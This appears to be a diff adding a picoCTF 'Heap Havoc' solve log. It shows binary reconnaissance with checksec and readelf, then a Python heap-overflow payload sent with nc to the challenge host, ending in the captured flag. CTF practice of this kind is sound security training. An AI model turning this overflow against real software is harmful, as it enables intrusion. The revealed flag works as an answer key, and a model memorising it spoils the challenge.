@@ -1,0 +1,32 @@
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Heap Havoc]
+└──╼ $ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols        No    0               3               vuln
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Heap Havoc]
+└──╼ $ readelf -s ./vuln | grep winner
+    74: 080492b6   182 FUNC    GLOBAL DEFAULT   15 winner
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Heap Havoc]
+└──╼ $ readelf -s ./vuln | grep .bss  
+    26: 0804c040     0 SECTION LOCAL  DEFAULT   26 .bss
+    72: 0804c040     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Heap Havoc]
+└──╼ $ python3 - << 'EOF' | nc foggy-cliff.picoctf.net 59913
+import sys
+import struct
+
+bss = 0x0804c040
+winner = 0x080492b6
+
+payload  = b"A" * 16
+payload += b"B" * 4
+payload += struct.pack("<I", bss)
+payload += struct.pack("<I", winner)
+payload += b" "
+payload += b"x"
+
+sys.stdout.buffer.write(payload + b"\n")
+EOF
+Enter two names separated by space:
+Enter two names separated by space:
+FLAG: picoCTF{h34p_0v3rfl0w_b59f3184}
+No winners this time, try again!
